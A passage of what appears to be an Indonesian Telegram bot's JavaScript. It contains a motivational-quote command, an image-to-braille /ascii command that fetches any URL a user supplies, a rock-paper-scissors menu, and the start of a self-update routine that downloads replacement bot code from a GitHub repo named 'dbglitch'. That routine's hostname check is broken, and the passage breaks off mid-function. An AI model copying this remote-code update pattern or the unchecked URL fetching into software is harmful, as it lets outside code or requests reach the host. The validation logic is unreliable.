    const chatId = msg.chat.id;

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const bacotan = pickRandom(galau);
    bot.sendMessage(chatId, bacotan);
});

const motivasi = [
 "ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
];

// Command: /quotesgalau
bot.onText(/^\/motivasi$/, (msg) => {
    const chatId = msg.chat.id;

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const bacotan = pickRandom(motivasi);
    bot.sendMessage(chatId, bacotan);
});        


bot.onText(/\/ascii(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const replied = msg.reply_to_message;
  const input = (match[1] || "").trim();

  let imageUrl = "";
  let fileId = "";
  let isTelegramFile = false;

  try {
    if (input && /^https?:\/\//i.test(input)) {
      imageUrl = input;
    } else if (replied?.photo) {
      const photos = replied.photo;
      fileId = photos[photos.length - 1].file_id;
      isTelegramFile = true;
    } else if (replied?.document && /\.(jpg|jpeg|png|webp)$/i.test(replied.document.file_name || "")) {
      fileId = replied.document.file_id;
      isTelegramFile = true;
    } else if (replied?.text && /^https?:\/\//i.test(replied.text.trim())) {
      imageUrl = replied.text.trim();
    } else if (replied?.caption && /^https?:\/\//i.test(replied.caption.trim())) {
      imageUrl = replied.caption.trim();
    }

    if (!imageUrl && !fileId) {
      return bot.sendMessage(chatId,
`📌 *Format ASCII Art:*
*Cara 1 — Reply foto:* Reply foto → \`/ascii\`
*Cara 2 — URL langsung:* \`/ascii https://...\``,
        { parse_mode: "Markdown" });
    }

    const proses = await bot.sendMessage(chatId, "⏳ Memproses ASCII Art...");

    let imageBuffer;
    if (isTelegramFile) {
      const fileLink = await bot.getFileLink(fileId);
      const imgRes = await axios.get(fileLink, { responseType: "arraybuffer" });
      imageBuffer = Buffer.from(imgRes.data);
    } else {
      const imgRes = await axios.get(imageUrl, { responseType: "arraybuffer" });
      imageBuffer = Buffer.from(imgRes.data);
    }

    if (!imageBuffer || imageBuffer.length === 0) throw new Error("Gagal download.");

    const croppedBuffer = await sharp(imageBuffer)
      .resize(100, 100, {
        fit: "cover",
        position: "center",
      })
      .toBuffer();

    const brailleModule = await import("braille-image");
    const imageToBraille = brailleModule.imageToBraille || brailleModule.default;

    const ascii = await imageToBraille(croppedBuffer, {
      width: 25, 
    });

    await bot.deleteMessage(chatId, proses.message_id).catch(() => {});
    const footer = "\n\n<blockquote>by GrenTzy1</blockquote>";
    
    const output = `<pre>${escapeHtml(ascii)}</pre>${footer}`;
    await bot.sendMessage(chatId, output, {
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id,
    });

  } catch (e) {
    console.error("❌ [ASCII] Error:", e.message);
    await bot.sendMessage(chatId,
`❌ *Gagal membuat ASCII Art*\n\n⚠️ Error: \`${e.message.slice(0, 150)}\``,
      { parse_mode: "Markdown" }).catch(() => {});
  }
});

// Command /suit
bot.onText(/^\/suit$/, async (msg) => {
  const chatId = msg.chat.id;
  const userName = msg.from.first_name || "Pengguna";

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🪨 Batu", callback_data: "suit_batu" },
          { text: "✂️ Gunting", callback_data: "suit_gunting" },
          { text: "📄 Kertas", callback_data: "suit_kertas" },
        ],
      ],
    },
  };

  await bot.sendMessage(chatId, `👊 Hai ${userName}! Pilih tanganmu untuk bermain suit:`, options);
});


// ============== AUTO UPDATE index.js ==============




// ============== KONSTANTA REPO ==============
const Owner = "pausorcarowr-cloud";
const Repo = "dbglitch";
const BranchPath = "main/Index.js";

const DEFAULT_RAW_URL =
  `https://raw.githubusercontent.com/${Owner}/${Repo}/${BranchPath}`;

// ============== KONFIGURASI ==============
const BOT_FILE = path.join(__dirname, "Index.js");
const BACKUP_DIR = path.join(__dirname, "backups");
const MAX_FILE_SIZE = 2 * 1024 * 1024;
const CONFIRM_EXPIRES_MS = 10 * 60 * 1000;

const pendingUpdates = new Map();
let checkingUpdate = false;
let updateInProgress = false;

// SHA-256 dari isi file
function getSHA256(data) {
  return crypto
    .createHash("sha256")
    .update(data)
    .digest("hex");
}

// Download file dari Raw GitHub
async function downloadUpdate() {
  const parsed = new URL(DEFAULT_RAW_URL);

  if (
    parsed.protocol !== "https:" ||
    parsed.hostname !== "raw.githubusercontent.com/pausorcarowr-cloud/dbglitch/refs/heads/main/tokens.json"
  ) {
    throw new Error("URL harus berasal dari Raw GitHub.");
  }

  const response = await axios.get(DEFAULT_RAW_URL, {
    responseType: "arraybuffer",
    timeout: 30000,
    maxContentLength: MAX_FILE_SIZE,
    maxBodyLength: MAX_FILE_SIZE,
    headers: {
      "Cache-Control": "no-cache"
    }
  });

  const data = Buffer.from(response.data);

  if (!data.length) {
